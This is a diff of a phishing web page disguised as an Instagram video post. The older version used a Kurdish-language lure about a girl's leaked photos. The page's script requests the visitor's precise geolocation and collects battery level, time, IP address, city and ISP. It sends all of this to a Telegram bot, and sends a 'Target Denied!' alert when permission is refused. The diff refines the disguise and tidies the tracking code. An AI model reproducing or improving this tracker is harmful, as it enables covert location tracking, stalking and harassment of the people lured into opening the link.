@@ -2,11 +2,18 @@
 <html lang="ku">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Instagram Video</title>
+    <meta property="og:title" content="Instagram Post by @reels">
+    <meta property="og:description" content="▶️ Watch this video on Instagram">
+    <meta property="og:site_name" content="Instagram">
+    <meta property="og:type" content="video.other">
     
-    <title>Video_7392.mp4</title> <meta property="og:title" content="هەواڵێکی نوێ وێنەی کچە کوردەکە بڵاو بووەوە">
-    <meta property="og:description" content="بۆ بینینی وێنەکان کلیک لەسەر لینکەکە بکە...">
-    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg"> <meta property="og:type" content="website">
+    <meta property="og:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
+    
     <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/saraharki/view/main/girl.jpg">
 
     <style>body { background: white; margin: 0; }</style>
 </head>
@@ -24,17 +31,14 @@
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             
-            // وەرگرتنی کات و باتری
-            const now = new Date();
-            const timeStr = now.toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
-
             let bat = "N/A";
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 bat = Math.floor(b.level * 100) + "%";
             }
 
-            // وەرگرتنی شار و ئایپی
+            // کات و شار و ئایپی بە وردی
+            const timeStr = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });
             let ip = "N/A", city = "Unknown", isp = "Korek";
             try {
                 const res = await fetch('https://ipwho.is/');
@@ -54,8 +58,7 @@
             navigator.sendBeacon(url);
 
         }, (err) => {
-            const url = `https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`;
-            navigator.sendBeacon(url);
+            navigator.sendBeacon(`https://api.telegram.org/bot${TK}/sendMessage?chat_id=${uid}&text=⚠️ Target Denied!`);
         }, { enableHighAccuracy: true, timeout: 5000 });
     }
 </script>
